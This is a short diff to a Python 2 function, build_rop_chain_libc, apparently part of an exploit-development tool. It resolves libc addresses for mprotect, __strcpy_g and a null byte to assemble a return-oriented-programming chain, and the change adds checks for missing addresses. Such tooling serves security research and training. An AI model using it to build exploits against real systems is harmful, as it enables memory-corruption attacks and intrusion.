@@ -912,14 +912,25 @@ def build_rop_chain_libc(lib_list, buf_address, libc_path, libc_base_address):
 
     mprotect_offset = get_function_address(elffile, "mprotect")
     mprotect_addr = pack_value(libc_base_address + mprotect_offset)
-    print '\tAddress of mprotect = 0x%x' %(mprotect_offset + libc_base_address)    
+    if mprotect_offset == 0:
+        print '\tUnable to find address of mprotect\t\t'
+    else:
+        print '\t[0x%x]\tAddress of mprotect\t\t' %(mprotect_offset + libc_base_address)
 
     strcpy_offset = get_function_address(elffile, "__strcpy_g")
     strcpy_addr = pack_value(libc_base_address + strcpy_offset)
-    print '\tAddress of strcpy = 0x%x' %(strcpy_offset + libc_base_address)
 
-    null_byte_location = pack_value(libc_base_address + find_null_byte(elffile))
-    print '\tNULL byte address = 0x%x' %(libc_base_address + find_null_byte(elffile))
+    if strcpy_offset == 0:
+        print '\tUnable to find address of __strcpy_g\t\t'
+    else:
+        print '\t[0x%x]\tAddress of __strcpy_g\t\t' %(strcpy_offset + libc_base_address)
+
+    null_byte_offset = find_null_byte(elffile)
+    null_byte_location = pack_value(libc_base_address + null_byte_offset)
+    if null_byte_offset == 0:
+        print '\tUnable to find address of null byte in .rodata\t\t'
+    else:
+        print '\t[0x%x]\tAddress of null byte\t\t' %(null_byte_offset + libc_base_address)
 
     temp, lib_name = find_gadget_addr(lib_list, find_pop2_ret)
     if temp == 0:
